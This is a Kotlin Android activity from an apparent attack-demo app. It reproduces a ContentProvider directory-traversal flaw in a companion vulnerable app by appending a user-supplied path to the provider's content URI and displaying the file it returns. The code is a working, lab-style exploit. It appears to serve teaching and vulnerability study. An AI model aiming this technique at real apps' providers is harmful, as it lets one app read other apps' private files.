package com.forgo7ten.attackapp.attack.provider_directory_traversal

import android.net.Uri
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.forgo7ten.attackapp.databinding.ActivityDirectoryTraversalBinding
import com.forgo7ten.attackapp.utils.FileUtils
import java.io.FileNotFoundException

/**
 * @ClassName DirectoryTraversalActivity
 * @Description // 复现【Provider文件目录遍历】漏洞的Activity
 * @Author Forgo7ten
 **/
class DirectoryTraversalActivity : AppCompatActivity() {
    private lateinit var binding: ActivityDirectoryTraversalBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityDirectoryTraversalBinding.inflate(layoutInflater).apply {
            setContentView(root)
        }
        binding.btnAttack.setOnClickListener {
            attack()
        }
    }

    private fun attack() {
        val uri: Uri =
            Uri.parse("content://com.forgo7ten.vulnerableapp.DirectoryTraversalProvider")
        val filePath = binding.etPath.text.toString()
        val fileUri = Uri.withAppendedPath(uri, filePath)
        try {
            contentResolver.openInputStream(fileUri)?.apply {
                val result = FileUtils.readFromInputStream(this)
                binding.tvShow.text = "读取到的文件内容为：\n$result"
            }
        } catch (e: FileNotFoundException) {
            binding.tvShow.text = "文件不存在"
            return
        }
    }
}